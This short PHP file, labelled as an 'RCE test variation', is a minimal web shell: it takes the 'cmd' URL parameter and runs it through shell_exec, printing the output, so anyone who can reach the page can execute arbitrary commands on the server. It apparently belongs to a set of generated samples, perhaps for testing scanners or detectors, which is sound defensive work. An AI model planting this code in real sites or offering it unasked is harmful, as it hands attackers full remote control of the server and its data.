<?php
// RCE test variation #1291
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>